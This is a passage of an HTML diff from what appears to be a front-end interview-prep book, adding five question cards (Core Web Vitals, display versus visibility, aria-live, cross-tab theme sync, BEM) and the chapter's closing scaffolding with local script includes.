+          </details>
+
+          <!-- Q16 -->
+          <details class="qa-card diff-advanced">
+            <summary class="qa-summary">
+              <span class="qa-num">Q16</span>
+              <span class="qa-title">What are the three Core Web Vitals, and what does each measure?</span>
+              <span class="qa-difficulty diff-advanced">Advanced</span>
+            </summary>
+            <div class="qa-body">
+              <div class="spoken-answer-box">
+                <span class="spoken-answer-label">Spoken Interview Answer</span>
+                <p>
+                  "Google's Core Web Vitals measure real-world user experience: 1. LCP (Largest Contentful Paint) measures loading performance: the time it takes for the largest image or text block in the viewport to render (target: < 2.5s). 2. INP (Interaction to Next Paint) measures responsiveness: latency between user interaction and next frame render (target: < 200ms). 3. CLS (Cumulative Layout Shift) measures visual stability: unexpected movement of visible page content during load (target: < 0.1)."
+                </p>
+              </div>
+            </div>
+          </details>
+
+          <!-- Q17 -->
+          <details class="qa-card diff-beginner">
+            <summary class="qa-summary">
+              <span class="qa-num">Q17</span>
+              <span class="qa-title">What is the difference between `display: none` and `visibility: hidden`?</span>
+              <span class="qa-difficulty diff-beginner">Beginner</span>
+            </summary>
+            <div class="qa-body">
+              <div class="spoken-answer-box">
+                <span class="spoken-answer-label">Spoken Interview Answer</span>
+                <p>
+                  "`display: none` removes the element entirely from the browser Render Tree; it occupies zero physical space in the layout, triggering a full Reflow. `visibility: hidden` hides the element visually, but it remains in the Render Tree, preserving its original width, height, and layout space on the screen, triggering only a Repaint."
+                </p>
+              </div>
+            </div>
+          </details>
+
+          <!-- Q18 -->
+          <details class="qa-card diff-intermediate">
+            <summary class="qa-summary">
+              <span class="qa-num">Q18</span>
+              <span class="qa-title">What is the purpose of the `aria-live` attribute? What is the difference between `polite` and `assertive`?</span>
+              <span class="qa-difficulty diff-intermediate">Intermediate</span>
+            </summary>
+            <div class="qa-body">
+              <div class="spoken-answer-box">
+                <span class="spoken-answer-label">Spoken Interview Answer</span>
+                <p>
+                  "`aria-live` announces dynamic content changes to screen reader users without requiring focus to move to that element (such as toast notifications or search results). With `aria-live='polite'`, the screen reader waits until the user has finished their current task before announcing the change. With `aria-live='assertive'`, the screen reader interrupts whatever it is currently reading to announce the message immediately, reserved for critical errors or alerts."
+                </p>
+              </div>
+            </div>
+          </details>
+
+          <!-- Q19 -->
+          <details class="qa-card diff-scenario">
+            <summary class="qa-summary">
+              <span class="qa-num">Q19</span>
+              <span class="qa-title">Scenario: You need to synchronize user theme preference (Light/Dark mode) across multiple open browser tabs in real time. How do you implement this?</span>
+              <span class="qa-difficulty diff-scenario">Scenario</span>
+            </summary>
+            <div class="qa-body">
+              <div class="spoken-answer-box">
+                <span class="spoken-answer-label">Spoken Interview Answer</span>
+                <p>
+                  "I store the theme in `localStorage.setItem('theme', newTheme)` and listen for the native `window.addEventListener('storage', event => ...)` event. The storage event fires on all *other* open tabs belonging to the same origin when localStorage is modified. When the event fires with key === 'theme', the other tabs read `event.newValue` and immediately apply the corresponding `data-theme` attribute to `document.documentElement`."
+                </p>
+              </div>
+            </div>
+          </details>
+
+          <!-- Q20 -->
+          <details class="qa-card diff-advanced">
+            <summary class="qa-summary">
+              <span class="qa-num">Q20</span>
+              <span class="qa-title">What is CSS BEM methodology, and what problem does it solve in large codebases?</span>
+              <span class="qa-difficulty diff-advanced">Advanced</span>
+            </summary>
+            <div class="qa-body">
+              <div class="spoken-answer-box">
+                <span class="spoken-answer-label">Spoken Interview Answer</span>
+                <p>
+                  "BEM stands for Block-Element-Modifier (`.card`, `.card__title`, `.card--highlighted`). It is a modular CSS naming convention designed to eliminate specificity wars and selector nesting bugs. By keeping every selector flat with a single class name (specificity 0, 0, 1, 0), it ensures high reusability, predictability, and prevents styles from accidentally leaking into child components."
+                </p>
+              </div>
+            </div>
+          </details>
+
+        </section>
+
+        <!-- Previous and Next Navigation -->
+        <nav id="prev-next-nav" class="prev-next-nav"></nav>
+
+      </div>
+    </main>
+
+    <aside id="chapter-toc" class="table-of-contents-rail"></aside>
+  </div>
+
+  <script src="../assets/js/book-data.js"></script>
+  <script src="../assets/js/theme.js"></script>
+  <script src="../assets/js/progress.js"></script>
+  <script src="../assets/js/prism.js"></script>
+  <script src="../assets/js/search.js"></script>
+  <script src="../assets/js/chapter.js"></script>
+</body>
+</html>
+
